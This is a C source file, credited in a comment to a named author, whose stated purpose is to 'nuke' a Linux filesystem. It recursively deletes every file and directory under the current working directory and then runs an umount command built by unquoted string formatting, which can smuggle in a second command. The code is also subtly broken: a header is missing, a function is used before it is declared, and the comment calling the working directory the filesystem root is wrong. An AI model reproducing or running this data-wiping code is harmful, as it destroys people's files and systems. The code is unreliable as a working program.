// Author: William Selby
// This program nukes a linux filesystem

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>

int main(int argc, char **argv) {
    
    // Step 1: Find the root of the file system
    char *root = malloc(sizeof(char) * 1024);
    getcwd(root, 1024);
    
    // Step 2: Recursively delete all the files and directories
    _nuke(root);
    
    // Step 3: Unmount the file system
    char *command = malloc(sizeof(char) * 1024);
    sprintf(command, "umount %s", root);
    system(command);
    free(command);
    free(root);
    
    return 0;
}

// Recursively delete all the files and directories
void _nuke(char *path) {
    DIR *dir = opendir(path);
    struct dirent *dir_entry;
   
    if (dir == NULL) {
        return;
    }
   
    // Read all the entries in the directory
    while ((dir_entry = readdir(dir)) != NULL) {
        // Skip the current and parent directories
        if (strcmp(dir_entry->d_name, ".") == 0 ||
            strcmp(dir_entry->d_name, "..") == 0) {
            continue;
        }
        
        // Create the full path of the entry
        char *entry_path = malloc(sizeof(char) * 1024);
        sprintf(entry_path, "%s/%s", path, dir_entry->d_name);
        
        // Check if the entry is a directory
        struct stat stat_buf;
        stat(entry_path, &stat_buf);
        if (S_ISDIR(stat_buf.st_mode)) {
            // Recursively delete the directory
            _nuke(entry_path);
        }
        else {
            // Delete the file
            remove(entry_path);
        }
        
        free(entry_path);
    }
    
    // Delete the directory itself
    rmdir(path);
    closedir(dir);
}
